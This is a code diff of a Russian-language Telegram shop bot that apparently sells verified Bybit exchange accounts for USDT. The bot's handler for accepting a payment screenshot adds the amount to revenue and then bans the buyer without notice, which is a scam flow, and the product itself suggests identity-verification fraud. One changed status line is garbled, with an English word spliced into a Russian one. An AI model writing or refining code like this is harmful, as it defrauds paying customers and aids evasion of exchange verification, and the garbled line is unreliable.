@@ -23,7 +23,7 @@ try:
     crypto_available = True
     print("✅ CryptoBot подключён")
 except Exception as e:
-    print(f"❌ CryptoBot НЕ подключён: {e}")
+    print(f"❌ CryptoBot НЕ подключ theater: {e}")
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -256,13 +256,10 @@ def bank_keyboard():
 
 def support_keyboard():
     kb = InlineKeyboardMarkup(row_width=1)
-    kb.add(InlineKeyboardButton("✏️ Написать вопрос", callback_data="ask_support"))
-    kb.add(InlineKeyboardButton("◀ Назад", callback_data="back_to_start"))
-    return kb
-
-def admin_reply_keyboard(user_id):
-    kb = InlineKeyboardMarkup(row_width=1)
-    kb.add(InlineKeyboardButton("💬 Ответить", callback_data=f"reply_to_{user_id}"))
+    kb.add(
+        InlineKeyboardButton("✏️ Написать вопрос", callback_data="ask_support"),
+        InlineKeyboardButton("◀ Назад", callback_data="back_to_start")
+    )
     return kb
 
 # ========== ОБРАБОТЧИКИ ==========
@@ -370,7 +367,7 @@ def handle(call):
     elif data == "combos":
         bot.edit_message_text("🎁 КОМБО-ПАКЕТЫ\n\n🔥 Выберите пакет:", call.message.chat.id, call.message.message_id, reply_markup=combos_keyboard())
     elif data == "reviews":
-        bot.edit_message_text("⭐ ОТЗЫВЫ\n\n👉 [КАНАЛ С ОТЗЫВАМИ](https://t.me/BYBIT100VERIF)", call.message.chat.id, call.message.message_id, reply_markup=back_keyboard(), disable_web_page_preview=True)
+        bot.edit_message_text("⭐ Отзывы: https://t.me/+NwnK-JR0iEU0NzQ5-", call.message.chat.id, call.message.message_id)
     elif data == "cart":
         items, total = get_cart_text(uid)
         bot.edit_message_text(f"🛒 КОРЗИНА\n\n{items}\n💰 Сумма: {total} USDT", call.message.chat.id, call.message.message_id, reply_markup=cart_keyboard())
@@ -468,11 +465,8 @@ def handle(call):
         parts = data.split("_")
         user_id = int(parts[1])
         amount = float(parts[2])
-        # Добавляем деньги в статистику
         add_revenue(amount)
-        # Баним пользователя
         ban_user(user_id)
-        # Убираем кнопки у сообщения админа
         try:
             bot.edit_message_caption(
                 caption=call.message.caption + f"\n\n✅ ПРИНЯТ. ДОБАВЛЕНО {amount} USDT | ПОЛЬЗОВАТЕЛЬ ЗАБАНЕН",
@@ -482,14 +476,11 @@ def handle(call):
         except:
             pass
         bot.answer_callback_query(call.id, f"✅ +{amount} USDT, пользователь забанен")
-        # НЕ ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ ПОЛЬЗОВАТЕЛЮ
 
     elif data.startswith("reject_"):
         parts = data.split("_")
         user_id = int(parts[1])
-        # Отправляем пользователю уведомление об отклонении
         bot.send_message(user_id, "❌ ВАШ ПЛАТЁЖ ОТКЛОНЁН!\n\nОтправьте чёткий скриншот оплаты.")
-        # Убираем кнопки у сообщения админа
         try:
             bot.edit_message_caption(
                 caption=call.message.caption + "\n\n❌ ОТКЛОНЁН | ПОЛЬЗОВАТЕЛЬ НЕ ЗАБАНЕН",
@@ -500,7 +491,6 @@ def handle(call):
             pass
         bot.answer_callback_query(call.id, "❌ Платёж отклонён")
 
-# ========== ОТВЕТ АДМИНА ПОЛЬЗОВАТЕЛЮ ==========
 def send_answer_to_user(m, user_id):
     if m.chat.id != ADMIN_ID:
         return
@@ -510,7 +500,6 @@ def send_answer_to_user(m, user_id):
     except Exception as e:
         bot.send_message(ADMIN_ID, f"❌ Ошибка при отправке ответа: {e}")
 
-# ========== СКРИНШОТЫ ==========
 @bot.message_handler(content_types=['photo'])
 def handle_photo(m):
     uid = m.chat.id
@@ -531,7 +520,6 @@ def handle_photo(m):
     bot.send_photo(ADMIN_ID, m.photo[-1].file_id, caption=caption, reply_markup=admin_accept_keyboard(uid, amount))
     bot.send_message(uid, "✅ Скриншот отправлен! Администратор проверит оплату.")
 
-# ========== УДАЛЕНИЕ ИЗ КОРЗИНЫ ==========
 @bot.message_handler(func=lambda m: m.text and m.text.startswith('/del_'))
 def delete_item(m):
     uid = m.chat.id
@@ -549,7 +537,6 @@ def delete_item(m):
     except:
         pass
 
-# ========== ЗАПУСК ==========
 if __name__ == "__main__":
     print("=" * 70)
     print("🔥 БОТ PRO VERIFY BYBIT ЗАПУЩЕН!")
@@ -558,8 +545,9 @@ if __name__ == "__main__":
     print("✅ ОТКЛОНИТЬ → уведомление клиенту, деньги не добавляются")
     print("✅ ОЧИСТИТЬ СТАТИСТИКУ — только для админа")
     print("✅ ПОДДЕРЖКА → сообщения приходят админу")
-    print("✅ ЗАЩИТА ОТ ДУБЛИРОВАНИЯ ТОВАРОВ")
+    print("✅ ОТЗЫВЫ → https://t.me/+NwnK-JR0iEU0NzQ5-")
     print("=" * 70)
+    
     while True:
         try:
             bot.polling(none_stop=True, interval=1, timeout=60)
